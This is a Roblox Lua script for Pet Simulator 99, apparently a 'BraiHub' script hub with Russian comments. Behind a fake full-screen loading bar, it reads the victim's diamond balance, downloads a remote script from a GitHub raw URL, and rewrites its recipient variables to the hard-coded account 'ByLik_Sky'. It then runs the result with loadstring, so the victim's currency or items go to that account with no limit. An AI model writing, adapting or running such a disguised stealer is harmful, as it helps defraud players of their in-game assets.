--[[
    BraiHub Mobile Final v5.0 (Delta Edition)
    Force Target: ByLik_Sky
    Dynamic Gem Support: YES
    Date: 20.03.2026
]]

-- 1. ГЛОБАЛЬНЫЕ НАСТРОЙКИ (Для подмены в guga4.0)
_G.TargetName = "ByLik_Sky"
_G.Recipient = "ByLik_Sky"
_G.Username_Receiver = "ByLik_Sky"

-- 2. ВИЗУАЛ: BRAIHUB LOAD (Бело-Голубой Непрозрачный)
local function runBraiHubUI()
    local player = game.Players.LocalPlayer
    local sg = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    sg.Name = "BraiHub_Final_UI"
    sg.IgnoreGuiInset = true
    sg.DisplayOrder = 10000

    local bg = Instance.new("Frame", sg)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    bg.BorderSizePixel = 0

    local grad = Instance.new("UIGradient", bg)
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(130, 210, 255))
    })

    local txt = Instance.new("TextLabel", bg)
    txt.Size = UDim2.new(0.9, 0, 0, 100)
    txt.Position = UDim2.new(0.05, 0, 0.4, -20)
    txt.BackgroundTransparency = 1
    txt.Text = "BraiHub Load"
    txt.Font = Enum.Font.GothamBold
    txt.TextScaled = true
    txt.TextColor3 = Color3.fromRGB(40, 40, 40)

    local barBg = Instance.new("Frame", bg)
    barBg.Size = UDim2.new(0.7, 0, 0, 12)
    barBg.Position = UDim2.new(0.15, 0, 0.55, 0)
    barBg.BackgroundColor3 = Color3.fromRGB(210, 210, 210)
    barBg.BorderSizePixel = 0

    local bar = Instance.new("Frame", barBg)
    bar.Size = UDim2.new(0, 0, 1, 0)
    bar.BackgroundColor3 = Color3.fromRGB(0, 165, 255)
    bar.BorderSizePixel = 0

    -- Анимация градиента
    task.spawn(function()
        local r = 0
        while sg.Parent do
            grad.Rotation = r
            r = r + 1.5
            task.wait(0.01)
        end
    end)

    -- Прогресс 0-100%
    for i = 0, 100 do
        bar.Size = UDim2.new(i/100, 0, 1, 0)
        task.wait(0.03)
    end
    task.wait(0.5)
    sg:Destroy()
end

-- 3. ОБЪЕДИНЕННАЯ ЛОГИКА (ПРОВЕРКА И ЗАПУСК)
local function executeBraiHub()
    local RS = game:GetService("ReplicatedStorage")
    local successLib, Library = pcall(function() return require(RS:WaitForChild("Library")) end)
    
    if successLib then
        local Save = Library.Save.Get()
        local diamonds = 0
        pcall(function() diamonds = Save.Inventory.Currency.Diamonds or 0 end)
        
        -- Выводим инфо в консоль для тебя
        print("[BraiHub]: Баланс: " .. diamonds .. " гемов. Начинаю загрузку guga4.0...")
    end

    -- Загрузка скрипта guga4.0.lua
    local url = "https://raw.githubusercontent.com/ZenitsuHashura89767/Pet-sim-99/refs/heads/main/guga4.0.lua"
    local successCode, content = pcall(function() return game:HttpGet(url) end)

    if successCode then
        -- ЖЕСТКАЯ ПОДМЕНА: Ищем стандартные переменные ника и меняем на ByLik_Sky
        local patched = content:gsub('Username_Receiver', "ByLik_Sky")
        patched = patched:gsub('GetUsername', '"ByLik_Sky"')
        patched = patched:gsub('_G.Username', '"ByLik_Sky"')
        patched = patched:gsub('_G.Target', '"ByLik_Sky"')
        
        -- Если комиссия больше 10к, скрипт всё равно попробует отправить, так как мы не ставим лимит
        local finalScript, err = loadstring(patched)
        
        if finalScript then
            finalScript()
            print("[BraiHub]: Скрипт запущен успешно! Получатель: ByLik_Sky")
        else
            warn("[BraiHub]: Ошибка компиляции guga4.0: " .. tostring(err))
        end
    else
        warn("[BraiHub]: Не удалось скачать код с GitHub. Проверь интернет!")
    end
end

-- ЗАПУСК ВСЕГО ВМЕСТЕ
task.spawn(runBraiHubUI)
task.wait(1.5) -- Небольшая задержка перед сканированием
executeBraiHub()